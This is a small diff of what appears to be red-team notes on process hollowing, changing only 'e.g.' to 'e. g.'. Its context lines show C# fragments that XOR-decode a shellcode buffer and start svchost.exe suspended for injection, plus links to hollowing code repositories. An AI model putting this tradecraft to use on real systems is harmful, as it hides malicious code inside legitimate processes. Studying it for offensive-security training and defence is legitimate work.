@@ -7,7 +7,7 @@
 * [https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Shellcode%20Process%20Hollowing/Program.cs](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Shellcode%20Process%20Hollowing/Program.cs)
 * [https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/DinvokeProcessHollow.cs](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/DinvokeProcessHollow.cs)
 
-1\. Create the target process (e.g., `svchost.exe`) in a suspended state.
+1\. Create the target process (e. g., `svchost.exe`) in a suspended state.
 
 ![](/.gitbook/assets/004.png)
 
@@ -136,7 +136,7 @@ namespace ProcessHollower
                 buf[i] = (byte)(buf[i] ^ (byte)'a');
             }
 
-            // Create the target process (e.g., svchost.exe) in a suspended state
+            // Create the target process (e. g., svchost.exe) in a suspended state
             STARTUPINFO si = new STARTUPINFO();
             PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
             bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
